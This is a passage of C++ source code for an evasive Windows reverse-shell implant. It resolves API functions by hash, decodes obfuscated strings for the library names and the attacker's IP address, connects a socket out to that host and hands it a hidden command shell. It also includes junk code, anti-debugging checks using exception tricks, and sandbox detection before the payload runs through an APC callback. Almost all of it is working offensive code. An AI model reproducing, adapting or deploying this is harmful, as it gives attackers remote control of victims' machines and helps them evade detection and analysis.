    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE *)ker_nel_32lld + exportDirectoryRVA);
    DWORD *functionNames = (DWORD *)((BYTE *)ker_nel_32lld + pExportDirectory->AddressOfNames);
    DWORD *functionAddresses = (DWORD *)((BYTE *)ker_nel_32lld + pExportDirectory->AddressOfFunctions);
    WORD *nameOrdinals = (WORD *)((BYTE *)ker_nel_32lld + pExportDirectory->AddressOfNameOrdinals);


    pGetProcAddress GetProcAddressFn = nullptr;


    for (DWORD i = 0; i < pExportDirectory->NumberOfNames; i++)
    {
        const char *functionName = (const char *)((BYTE *)ker_nel_32lld + functionNames[i]);
        uint32_t functionHash = GetHash(functionName);

        if (functionHash == targetHash)
        {

            DWORD functionAddressRVA = functionAddresses[nameOrdinals[i]];
            GetProcAddressFn = (pGetProcAddress)((BYTE *)ker_nel_32lld + functionAddressRVA);
            break; 
        }
    }

    FARPROC w_sa_St_ar_tup = GetProcAddressFn(w_s2_32lib, decodeString(w_s_o, sizeof(w_s_o) / sizeof(w_s_o[0]), big_string, key).c_str());
    volatile int dummyVar = 0x1337;
    dummyVar ^= 0xdeadbeef;
    dummyVar += complexDummyFunction(dummyVar, 0xcafebabe);
    FARPROC Connectsaw = GetProcAddressFn(w_s2_32lib, decodeString(w_c_o, sizeof(w_c_o) / sizeof(w_c_o[0]), big_string, key).c_str());
    FARPROC wsaSocket = GetProcAddressFn(w_s2_32lib, decodeString(w_soc_offset, sizeof(w_soc_offset) / sizeof(w_soc_offset[0]), big_string, key).c_str());
    FARPROC htonsFunc = GetProcAddressFn(w_s2_32lib, decodeString(h_t_o, sizeof(h_t_o) / sizeof(h_t_o[0]), big_string, key).c_str());
    FARPROC inetAddr = GetProcAddressFn(w_s2_32lib, decodeString(i_a_o, sizeof(i_a_o) / sizeof(i_a_o[0]), big_string, key).c_str());

    while (false)
    {
        char *dummyBuffer = new char[1024];
        memset(dummyBuffer, 0, 1024);
        delete[] dummyBuffer;
    }
    reinterpret_cast<int(WINAPI *)(WORD, LPWSADATA)>(w_sa_St_ar_tup)(MAKEWORD(2, 2), &wsaData);

    string original_ws_2_32_dl_l = decodeString(w_s_2_32lld, sizeof(w_s_2_32lld) / sizeof(w_s_2_32lld[0]), big_string, key).c_str();
    wstring wide_original_ws_2_32_dl_l(original_ws_2_32_dl_l.begin(), original_ws_2_32_dl_l.end());

    GetModuleHandleW_t pGetModuleHandleW = (GetModuleHandleW_t)GetProcAddressFn(ker_nel_32lld, decodeString(g_et_mod_u_l_o_handelW, sizeof(g_et_mod_u_l_o_handelW) / sizeof(g_et_mod_u_l_o_handelW[0]), big_string, key).c_str());
    WSASocketFunc wsaSocketFunc = reinterpret_cast<WSASocketFunc>(
        GetProcAddressFn(pGetModuleHandleW(wide_original_ws_2_32_dl_l.c_str()),
                         decodeString(w_s_a_o, sizeof(w_s_a_o) / sizeof(w_s_a_o[0]), big_string, key).c_str()));

    wSock = wsaSocketFunc(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, 0);

    hax.sin_family = AF_INET;
    hax.sin_port = reinterpret_cast<u_short(__stdcall *)(u_short)>(htonsFunc)(port);
    hax.sin_addr.s_addr = reinterpret_cast<unsigned long(__stdcall *)(const char *)>(inetAddr)(
        decodeString(ipaddr_offset, sizeof(ipaddr_offset) / sizeof(ipaddr_offset[0]), big_string, key).c_str());

    reinterpret_cast<int(WINAPI *)(SOCKET, const struct sockaddr *, int, LPWSABUF, LPWSABUF,
                                   LPQOS, LPQOS, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE)>(Connectsaw)(
        wSock, reinterpret_cast<const sockaddr *>(&hax), sizeof(hax), nullptr, nullptr, nullptr, nullptr, nullptr, nullptr);

    FARPROC createPr0cess = GetProcAddressFn(LoadLibraryA(decodeString(k_renel_32, sizeof(k_renel_32) / sizeof(k_renel_32[0]), big_string, key).c_str()),
                                             decodeString(c_p_o, sizeof(c_p_o) / sizeof(c_p_o[0]), big_string, key).c_str());
    FARPROC waitF0rSingleObject = GetProcAddressFn(LoadLibraryA(decodeString(k_renel_32, sizeof(k_renel_32) / sizeof(k_renel_32[0]), big_string, key).c_str()),
                                                   decodeString(w_f_s_o_o, sizeof(w_f_s_o_o) / sizeof(w_f_s_o_o[0]), big_string, key).c_str());

    STARTUPINFOA sui;
    PROCESS_INFORMATION pi;
    memset(&sui, 0, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES;
    sui.wShowWindow = SW_HIDE;
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)wSock;

    reinterpret_cast<BOOL(WINAPI *)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
                                    BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION)>(
        createPr0cess)(nullptr, const_cast<LPSTR>(decodeString(exe_c_m_d, sizeof(exe_c_m_d) / sizeof(exe_c_m_d[0]), big_string, key).c_str()), nullptr, nullptr, TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &sui, &pi);

    reinterpret_cast<DWORD(WINAPI *)(HANDLE, DWORD)>(waitF0rSingleObject)(pi.hProcess, INFINITE);
}


volatile BOOL g_isDebugged = TRUE;

LONG WINAPI CustomVectoredExceptionHandler(PEXCEPTION_POINTERS pExceptionPointers) {
    if (pExceptionPointers->ExceptionRecord->ExceptionCode == EXCEPTION_BREAKPOINT) {
        pExceptionPointers->ContextRecord->Rip++;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

bool checkAdvancedDebugger()
{
    g_isDebugged = TRUE;

    __try {
        DebugBreak();
    }
    __except (GetExceptionCode() == EXCEPTION_BREAKPOINT ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) {
        g_isDebugged = FALSE;
    }

    __try {
        RaiseException(EXCEPTION_BREAKPOINT, 0, 0, NULL);
    }
    __except (GetExceptionCode() == EXCEPTION_BREAKPOINT ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) {
        g_isDebugged = FALSE;
    }

    PVOID vehHandler = AddVectoredExceptionHandler(1, CustomVectoredExceptionHandler);

    __try {
        RaiseException(EXCEPTION_ILLEGAL_INSTRUCTION, 0, 0, NULL);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        printf("ec\n");
    }

    RemoveVectoredExceptionHandler(vehHandler);

    if (g_isDebugged) {
        printf("Debugger detected through advanced exception handling\n");
        return false;
    }

    printf("No debugger detected through advanced exception handling\n");
    return true;
}

bool isSafeEnvironment()
{
     return checkSystemResources() && CheckHDDName() && CheckApplicationName() 
            ;



}

VOID CALLBACK MyCallback(DWORD errorCode, DWORD bytesTransferred, LPOVERLAPPED pOverlapped) {
    executePayload();
}

int main(int argc, char *argv[])
{
    std::string base64EncodedBaseString = "uk6sTBTyb6d25SuPVMaqO2C8";
    std::string decodedBaseString = base64_decode(base64EncodedBaseString);
    int encryptedDataLength = strlen((PCHAR)decodedBaseString.c_str());
    initializeGlobalKey((PCHAR)decodedBaseString.c_str(), encryptedDataLength);
    if (!isSafeEnvironment())
    {
        printf("Virtual environment or insufficient resources detected.\n");
        Sleep(15000);
        return 1;
    }

    wchar_t* winIniPath = decodeAndDecryptToWide(encryptedWinIniPath);
    HANDLE hFile = CreateFileW(winIniPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
    delete[] winIniPath;
    PVOID fileBuffer = VirtualAlloc(0, 64, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    OVERLAPPED overlapped = {0};
    ReadFileEx(hFile, fileBuffer, 32, &overlapped, MyCallback);
    WaitForSingleObjectEx(hFile, INFINITE, true);

    return 0;
}

